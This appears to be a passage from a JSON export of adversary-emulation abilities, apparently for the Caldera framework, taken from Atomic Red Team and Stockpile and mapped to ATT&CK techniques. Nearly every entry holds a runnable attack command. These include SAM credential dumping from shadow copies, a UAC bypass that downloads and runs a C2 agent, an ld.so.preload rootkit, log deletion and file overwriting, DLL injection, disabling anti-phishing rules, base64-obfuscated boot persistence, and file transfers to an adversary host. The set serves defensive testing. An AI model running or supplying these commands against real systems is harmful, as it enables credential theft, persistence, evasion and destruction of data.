catch {};  ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore; }", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "69219b448ba0a75bae573d58d8b6cf40", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "dump volume shadow copy hives with System.IO.File", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as \"HiveNightmare\" or \"SeriousSAM\".\nThis can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["for /L %a in (1,1,10) do @(del %temp%\\SAMvss%a >nul 2>&1)"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "for /L %a in (1,1,10) do @(certutil -f -v -encodehex \"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy%a\\Windows\\System32\\config\\SAM\" %temp%\\SAMvss%a 2 >nul 2>&1) && dir /B %temp%\\SAMvss%a", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "e11194c092261fb1a60c378aa8788e15", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "dump volume shadow copy hives with certutil", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "UIPI bypass with uiAccess application", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["Akagi64.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a", "technique_id": "T1548.002", "tactic": "privilege-escalation", "requirements": [], "name": "duser/osksupport DLL Hijack", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i \"\\:^/usr/local/lib/libprocesshider.so:d\" /etc/ld.so.preload; rm -rf /usr/local/lib/libprocesshider.so /usr/local/bin/evil_script.py /tmp/atomic"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload; /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Rootkit", "ability_id": "1a35d5a1ced99d3e5e764ac6f5ba727f", "technique_id": "T1014", "tactic": "defense-evasion", "requirements": [], "name": "dynamic-linker based rootkit (libprocesshider)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enumerate running virtual machines on hypervisor", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.stockpile.app.parsers.acrn", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "hypervisor.vm.name"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "acrnctl list", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "0093c0e0-68b6-4cab-b0d4-2b40b3c78f71", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "enumerate VMs", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Copy the SAM hive using the esentutl.exe utility\nThis can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.\n", "repeatable": false, "privilege": "", "buckets": ["credential-access"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\SAM >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "OS Credential Dumping: Security Account Manager", "ability_id": "d21b4ae13ee85560eb6b82c5c9150ae7", "technique_id": "T1003.002", "tactic": "credential-access", "requirements": [], "name": "esentutl.exe SAM copy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use 'iwr' or \"Invoke-WebRequest\" -URI argument to download a file from the web. Note: without -URI also works in some versions.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del %temp%\\Atomic-license.txt >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\\Atomic-license.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "5f468e3e1c415900aab5e33f88da8c60", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "iwr or Invoke Web-Request download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "dd of=/var/log/syslog if=/dev/zero count=$(ls -l /var/log/syslog | awk '{print $5}') iflag=count_bytes", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Destruction", "ability_id": "2cc4d863d4b7c634e8b6add14cf8c7a4", "technique_id": "T1485", "tactic": "impact", "requirements": [], "name": "macOS/Linux - Overwrite file with DD", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test simulates a high CPU load as you might observe during cryptojacking attacks.\nEnd the test by using CTRL/CMD+C to break.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "yes > /dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "yes > /dev/null", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Resource Hijacking", "ability_id": "5f407c31b29d92be4648b3cff37e0abe", "technique_id": "T1496", "tactic": "impact", "requirements": [], "name": "macOS/Linux - Simulate CPU Load with Yes", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["set comspec=%windir%\\System32\\cmd.exe"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "set comspec=%windir%\\System32\\calc.exe && cscript %windir%\\System32\\manage-bde.wsf", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Script Proxy Execution", "ability_id": "b14f62dd9f3c6132609147710f4a55b3", "technique_id": "T1216", "tactic": "defense-evasion", "requirements": [], "name": "manage-bde.wsf Signed Script Command Execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Injects arbitrary DLL into running process specified by process ID. Requires Windows 10.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Signed Binary Proxy Execution", "ability_id": "c0b42b65828121e95e34a7bbf1a004ce", "technique_id": "T1218", "tactic": "defense-evasion", "requirements": [], "name": "mavinject - Inject DLL into running process", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["if(\"None\" -ne \"\") {; $secure_pwd = (\"None\" + \"\") | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Enable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule; }"], "code": null, "timeout": 60, "build_target": null, "platform": "unknown", "command": "$secure_pwd = \"None\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"None\", $secure_pwd; Connect-ExchangeOnline -Credential $creds; $test = Get-AntiPhishRule; Disable-AntiPhishRule -Identity $test.Name -Confirm:$false; Get-AntiPhishRule", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify Tools", "ability_id": "c6d6e157f9ff496abfed129dda16fe13", "technique_id": "T1562.001", "tactic": "defense-evasion", "requirements": [], "name": "office-365-Disable-AntiPhishRule", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Adds a registry key to set up a proxy on the endpoint at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\PortProxy\\v4tov4\nUpon execution there will be a new proxy entry in netsh\nnetsh interface portproxy show all\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["netsh interface portproxy delete v4tov4 listenport=1337 -ErrorAction Ignore | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Proxy: Internal Proxy", "ability_id": "b0eb5108debf92ed5707a964b2bf3481", "technique_id": "T1090.001", "tactic": "command-and-control", "requirements": [], "name": "portproxy reg key", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore; Stop-Process -Name \"calculator\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"; Powershell -noprofile", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Hijack Execution Flow: Path Interception by Search Order Hijacking", "ability_id": "e538e0ff74962aaf1dbd08baa5c7853f", "technique_id": "T1574.008", "tactic": "multiple", "requirements": [], "name": "powerShell Persistence via hijacking default modules - Get-Variable.exe", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Will execute a command on the remote host with Impacket psexec.py script.\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "psexec.py '/Administrator:P@ssw0rd1@127.0.0.1' 'whoami'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "System Services: Service Execution", "ability_id": "6d40caedb0738bd37dd673f0321ab584", "technique_id": "T1569.002", "tactic": "execution", "requirements": [], "name": "psexec.py (Impacket)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Initialization Scripts: Rc.common", "ability_id": "ab44803d5a9c299258efff185b0f70b5", "technique_id": "T1037.004", "tactic": "multiple", "requirements": [], "name": "rc.common", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify rc.common\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common; sudo chmod +x /etc/rc.common", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Initialization Scripts: Rc.common", "ability_id": "9bd17863cd45f82002a6f011de139363", "technique_id": "T1037.004", "tactic": "multiple", "requirements": [], "name": "rc.common", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Modify rc.local\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp $origfilename /etc/rc.local && sudo rm $origfilename;fi"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi; printf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local; echo \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local; printf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local; sudo chmod +x /etc/rc.local", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Initialization Scripts: Rc.common", "ability_id": "77f61dda65d9eefb8f8a08321e1c00c8", "technique_id": "T1037.004", "tactic": "multiple", "requirements": [], "name": "rc.local", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Delete system and audit logs\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo rm -rf /private/var/log/system.log*; sudo rm -rf /private/var/audit/*", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sudo rm -rf /private/var/log/system.log*; sudo rm -rf /private/var/audit/*", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Indicator Removal on Host: Clear Linux or Mac System Logs", "ability_id": "0e0bf52a7d3c64d3b9c8a6106bf92926", "technique_id": "T1070.002", "tactic": "defense-evasion", "requirements": [], "name": "rm -rf", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize rsync to perform a remote file copy (pull)\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "rsync -r adversary@adversary-host:/tmp/adversary-rsync/ /tmp/victim-files", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "50a319ee67cdb786e6207194c8d61c72", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "rsync remote file copy (pull)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize rsync to perform a remote file copy (push)\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "rsync -r /tmp/adversary-rsync/ victim@victim-host:/tmp/victim-files", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "866227c57aaeb1e0e9d761e15fc29e44", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "rsync remote file copy (push)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize scp to perform a remote file copy (pull)\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "scp adversary@adversary-host:/tmp/adversary-scp /tmp/victim-files/", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "f4e6b028e9c60c515541d52921fa2b48", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "scp remote file copy (pull)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize scp to perform a remote file copy (push)\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "scp /tmp/adversary-scp victim@victim-host:/tmp/victim-files/", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "2f872c3c1107218205093c16a8cb6d66", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "scp remote file copy (push)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "secedit allows to manipulate the HKLM hive of the Windows registry. This test creates a Run key with the keyname calc having calc.exe as the value in the HKLM hive.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["035557_regtemplate.ini"], "parsers": [], "cleanup": ["REG DELETE \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /V \"calc\" /f >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "secedit /import /db mytemplate.db /cfg 035557_regtemplate.ini && secedit /configure /db mytemplate.db", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", "ability_id": "57058d39378e4ce49ccc8560efc49ee5", "technique_id": "T1547.001", "tactic": "multiple", "requirements": [], "name": "secedit used to create a Run key in the HKLM Hive", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize sftp to perform a remote file copy (pull)\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sftp adversary@adversary-host:/tmp/adversary-sftp /tmp/victim-files/", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "2443f86c5b3067f3c3fda59384c566b6", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "sftp remote file copy (pull)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Utilize sftp to perform a remote file copy (push)\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "sftp victim@victim-host:/tmp/victim-files/ <<< $'put /tmp/adversary-sftp'", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "806814854866002bd861b76b7a2ee2c9", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "sftp remote file copy (push)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "svchost.exe writing a non-Microsoft Office file to a file with a UNC path.\nUpon successful execution, this will rename cmd.exe as svchost.exe and move it to `c:\\`, then execute svchost.exe with output to a txt file.\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["del C:\\T1105.txt >nul 2>&1 && del C:\\\\svchost.exe >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "copy C:\\Windows\\System32\\cmd.exe C:\\svchost.exe && C:\\svchost.exe /c echo T1105 > \\\\localhost\\c$\\T1105.txt", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "e6715e61f5df646692c624b3499384c4", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "svchost writing a file to a UNC path", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Capture running processes and their loaded DLLs", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "tasklist /m  >> $env:APPDATA\\vmtool.log;\ncat $env:APPDATA\\vmtool.log", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Process Discovery", "ability_id": "8adf02e8-6e71-4244-886c-98c402857404", "technique_id": "T1057", "tactic": "discovery", "requirements": [], "name": "tasklist Process Enumeration", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Use AppleScript to get Quicktime Player to record an audio file from the default microphone.\n\nShould create a non-empty m4a file with sound from the microphone.\n\n- requires Automation permissions but no additional microphone permissions\n- saves file in /tmp by default. Other locations likely to require more permissions.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["28b0bd_T1123.sh"], "parsers": [], "cleanup": ["if test -w /tmp/T1123.m4a; then   rm /tmp/T1123.m4a; fi"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sh 28b0bd_T1123.sh /tmp/T1123.m4a 5", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Audio Capture", "ability_id": "e8553d5d1077db444ab2bf2938b5fc5b", "technique_id": "T1123", "tactic": "collection", "requirements": [], "name": "using Quicktime Player", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Audio Capture", "ability_id": "53d41aa7edbb10cea4c99df8c2b0862f", "technique_id": "T1123", "tactic": "collection", "requirements": [], "name": "using device audio capture commandlet", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Download a remote file using the whois utility\n", "repeatable": false, "privilege": "", "buckets": ["command-and-control"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1105.whois.out"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out", "language": null, "name": "sh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["rm -f /tmp/T1105.whois.out"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "timeout --preserve-status 1 whois -h localhost -p 8443 \"Hello from Atomic Red Team test T1105\" > /tmp/T1105.whois.out", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Ingress Tool Transfer", "ability_id": "253e8dc2d0195de95eae8e9ec7e350a9", "technique_id": "T1105", "tactic": "command-and-control", "requirements": [], "name": "whois file download", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe", "repeatable": false, "privilege": "", "buckets": ["privilege-escalation"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["Akagi64.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe", "language": null, "name": "cmd", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["Akagi64.exe"], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": 